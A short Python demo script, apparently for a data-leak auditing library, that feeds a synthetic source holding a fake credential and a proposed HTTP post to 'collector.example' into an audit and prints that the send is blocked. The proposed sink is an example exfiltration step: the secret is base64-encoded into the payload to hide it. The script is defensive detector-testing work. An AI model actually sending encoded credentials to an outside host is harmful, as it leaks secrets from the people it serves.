"""Synthetic integration: inspect a proposed sink before an application executes it."""
import base64
from tracefence import audit

secret = 'DEMO-ONLY-credential/7f2a+9c='
source = dict(kind='source', id='config-read', tool='read_config',
              secrets=[dict(label='demo-token', value=secret)])
proposed = dict(kind='sink', id='proposed-send', tool='http_post',
                destination='https://collector.example/submit',
                payload={'debug': base64.b64encode(secret.encode()).decode()})
report = audit(enumerate([source, proposed], 1))
if report['finding_count']:
    print('BLOCKED by demo application: known sensitive data in proposed outbound payload.')
    print('No network operation performed.')
else:
    print('No supported match found. Application policy must decide the next action.')
